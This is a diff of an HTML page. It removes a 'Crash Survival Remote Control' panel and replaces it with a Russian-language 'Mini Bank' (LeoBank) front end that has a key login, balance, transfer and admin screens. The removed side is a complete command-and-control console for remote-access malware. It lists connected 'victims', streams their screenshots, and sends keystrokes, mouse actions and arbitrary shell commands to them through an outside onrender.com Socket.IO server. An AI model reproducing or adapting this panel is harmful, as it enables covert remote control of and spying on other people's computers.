@@ -1,156 +1,92 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Remote Control Panel</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.0/socket.io.js"></script>
-    <style>
-        body { font-family: Arial; margin: 20px; background: #111; color: #0f0; }
-        .container { display: flex; gap: 20px; }
-        .sidebar { width: 300px; }
-        .main { flex: 1; }
-        .victim-list { background: #222; padding: 10px; margin-bottom: 20px; }
-        .victim-item { padding: 8px; margin: 5px 0; background: #333; cursor: pointer; }
-        .victim-item:hover { background: #444; }
-        .selected { background: #006600 !important; }
-        #screenshot { width: 100%; border: 2px solid #0f0; }
-        .controls { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
-        button { padding: 10px; background: #333; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
-        button:hover { background: #444; }
-        .command-box { width: 100%; height: 100px; background: #222; color: #0f0; padding: 10px; margin: 10px 0; }
-        #output { background: #000; padding: 10px; height: 200px; overflow-y: scroll; font-family: monospace; }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mini Bank</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
-    <h1>✈️ Crash Survival Remote Control</h1>
-    <div class="container">
-        <div class="sidebar">
-            <div class="victim-list">
-                <h3>Connected Victims</h3>
-                <div id="victimContainer"></div>
-            </div>
-            <div class="controls">
-                <button onclick="sendMouse('click left')">Left Click</button>
-                <button onclick="sendMouse('click right')">Right Click</button>
-                <button onclick="sendMouse('scroll 10')">Scroll Down</button>
-                <button onclick="sendMouse('scroll -10')">Scroll Up</button>
-                <button onclick="sendKeyboard('enter')">Enter</button>
-                <button onclick="sendKeyboard('alt+f4')">Alt+F4</button>
-                <button onclick="sendSystem('screenshot')">Refresh Screen</button>
-                <button onclick="sendSystem('info')">System Info</button>
-                <button onclick="openShell()">Open Shell</button>
-            </div>
-            <div>
-                <input type="text" id="typeText" placeholder="Text to type" style="width:100%;padding:8px;background:#222;color:#0f0;border:1px solid #0f0;">
-                <button onclick="typeText()">Type Text</button>
-            </div>
-        </div>
-        
-        <div class="main">
-            <h3>Live Screen: <span id="selectedVictim">None</span></h3>
-            <img id="screenshot" src="" alt="No screenshot available">
-            
-            <h3>Shell Command</h3>
-            <input type="text" id="shellCommand" placeholder="Enter shell command" style="width:80%;padding:8px;">
-            <button onclick="sendShell()">Execute</button>
-            
-            <h3>Output</h3>
-            <div id="output"></div>
+
+    <div id="auth-screen" class="screen">
+        <div class="auth-card">
+            <h2>Введите ключ</h2>
+            <input type="password" id="auth-key" placeholder="Ключ доступа">
+            <button onclick="login()">Войти</button>
         </div>
     </div>
 
-    <script>
-        const socket = io('https://site-acwv.onrender.com');
-        let selectedVictim = null;
+    <div id="app-screen" class="screen hidden">
         
-        socket.on('connect', () => {
-            logOutput('[+] Connected to server');
-        });
-        
-        socket.on('victim_list_update', (victims) => {
-            const container = document.getElementById('victimContainer');
-            container.innerHTML = '';
-            victims.forEach(victim => {
-                const div = document.createElement('div');
-                div.className = 'victim-item';
-                div.textContent = victim;
-                div.onclick = () => selectVictim(victim);
-                if (victim === selectedVictim) div.classList.add('selected');
-                container.appendChild(div);
-            });
-        });
-        
-        socket.on('screenshot_update', (data) => {
-            if (data.id === selectedVictim) {
-                document.getElementById('screenshot').src = 'data:image/png;base64,' + data.screenshot;
-            }
-        });
-        
-        socket.on('command_output', (data) => {
-            logOutput(`[${data.victim}] ${data.output}`);
-        });
-        
-        function selectVictim(victim) {
-            selectedVictim = victim;
-            document.getElementById('selectedVictim').textContent = victim;
-            document.querySelectorAll('.victim-item').forEach(el => {
-                el.classList.toggle('selected', el.textContent === victim);
-            });
-            logOutput(`[*] Selected victim: ${victim}`);
-        }
-        
-        function sendCommand(type, command) {
-            if (!selectedVictim) {
-                alert('Select a victim first!');
-                return;
-            }
-            socket.emit('command_from_web', {
-                victim_id: selectedVictim,
-                type: type,
-                command: command
-            });
-            logOutput(`[>>] ${type}: ${command}`);
-        }
-        
-        function sendMouse(command) {
-            sendCommand('mouse', command);
-        }
-        
-        function sendKeyboard(command) {
-            sendCommand('keyboard', command);
-        }
-        
-        function sendShell() {
-            const cmd = document.getElementById('shellCommand').value;
-            if (cmd) sendCommand('shell', cmd);
-        }
-        
-        function sendSystem(command) {
-            sendCommand('system', command);
-        }
-        
-        function typeText() {
-            const text = document.getElementById('typeText').value;
-            if (text) sendCommand('keyboard', 'type ' + text);
-        }
-        
-        function openShell() {
-            sendCommand('shell', 'start cmd' + (navigator.platform.includes('Win') ? '' : 'terminal'));
-        }
-        
-        function logOutput(message) {
-            const output = document.getElementById('output');
-            const line = document.createElement('div');
-            line.textContent = '> ' + message;
-            output.appendChild(line);
-            output.scrollTop = output.scrollHeight;
-        }
-        
-        // Auto-refresh victim list every 5 seconds
-        setInterval(() => {
-            socket.emit('get_victims');
-        }, 5000);
-        
-        logOutput('[*] Control panel loaded. Waiting for victims...');
-    </script>
+        <div id="page-main" class="page">
+            <div class="header-gradient">
+                <div class="balance-container">
+                    <h1 id="user-balance">0.00 <span>₼</span></h1>
+                    <p>Личные средства</p>
+                </div>
+                
+                <div class="action-buttons">
+                    <div class="action" onclick="showModal('topup')">
+                        <div class="icon">+</div>
+                        <span>Пополнить</span>
+                    </div>
+                    <div class="action" onclick="showModal('transfer')">
+                        <div class="icon">→</div>
+                        <span>Перевести</span>
+                    </div>
+                </div>
+
+                <div class="card-preview" onclick="toggleCardAnim()">
+                    <div class="card-chip"></div>
+                    <div class="card-logo">LeoBank</div>
+                    <div class="card-number" id="card-num-display">**** **** **** ****</div>
+                </div>
+            </div>
+
+            <div class="history-section">
+                <h3>История транзакций</h3>
+                <div id="history-list">
+                    <p class="empty">У вас пока нет операций</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="page-profile" class="page hidden">
+            <div class="profile-header">
+                <div class="avatar">👤</div>
+                <h2 id="display-name">Пользователь</h2>
+            </div>
+            <div class="profile-settings">
+                <input type="text" id="new-name" placeholder="Введите имя">
+                <button onclick="updateName()">Сохранить имя</button>
+            </div>
+        </div>
+
+        <div id="page-admin" class="page hidden">
+            <h3>Управление пользователями</h3>
+            <div id="admin-user-list"></div>
+        </div>
+
+        <nav class="bottom-nav">
+            <div onclick="switchPage('main')">🏠<span>Главная</span></div>
+            <div onclick="switchPage('profile')">👤<span>Профиль</span></div>
+            <div id="nav-admin" class="hidden" onclick="switchPage('admin')">⚙️<span>Админ</span></div>
+        </nav>
+    </div>
+
+    <div id="modal-overlay" class="hidden">
+        <div class="modal">
+            <h3 id="modal-title"></h3>
+            <input type="text" id="modal-input-1" placeholder="">
+            <input type="number" id="modal-input-2" placeholder="Сумма">
+            <div class="modal-btns">
+                <button onclick="closeModal()">Отмена</button>
+                <button id="modal-confirm-btn">Ок</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
